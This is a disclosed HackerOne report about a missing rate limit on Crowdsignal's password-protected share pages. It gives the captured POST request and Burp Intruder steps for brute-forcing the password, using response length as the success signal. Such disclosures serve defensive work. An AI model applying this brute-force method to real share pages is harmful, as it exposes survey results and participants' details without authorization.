# Entering passwords on the Share Login Page can lead to a brute-force attack

## Report Details
- **Report ID**: 2039447
- **URL**: https://hackerone.com/reports/2039447
- **State**: Closed
- **Severity**: low
- **Submitted**: 2023-06-26T23:08:02.400Z
- **Disclosed**: 2023-08-27T18:09:46.230Z

## Reporter
- **Username**: riadalrashed
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
## Summary:
I have identified that when sharing the Results with a password, the request (POST method) when entering a password has no rate limit, which can then be used to loop through one request. An attacker can brute-force for a password and can get a possibly a dashboard Results.

A rate limiting algorithm is used to check if the user session (or IP-address) has to be limited based on the information in the session cache. In case a client made too many requests within a given timeframe, HTTP-Servers can respond with status code 429: Too Many Requests.

The problem here is that the sharing links are crawled, so if there is a link that does not contain a password, the account information will be revealed, and if there is a password, it can be brute-forced .

█████

## Steps To Reproduce:
1. Go to https://app.crowdsignal.com/share/███ (this my Survey)
2. Enter any password and click Login.
3. Intercept the request (you can use Burp Suite tool to do this)
4.
```
POST /share/████████/password HTTP/1.1
Host: app.crowdsignal.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: https://app.crowdsignal.com
Connection: close
Referer: https://app.crowdsignal.com/share/██████
Cookie:
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

action=password&nonce=██████████&password=§
```
5. Now Send This Request To Intruder And brute-force it 1000 times with a list of 1000 passwords.
6. See that you will get a length of 297 when the password is incorrect and when you get 414 that is the correct password.


## Supporting Material/References:
████

## Impact

If an attacker successfully brute forces the password, they may be able to access the following: Results, Answer Details, Devices, Locations, and Participants.

## Attachments
No attachments
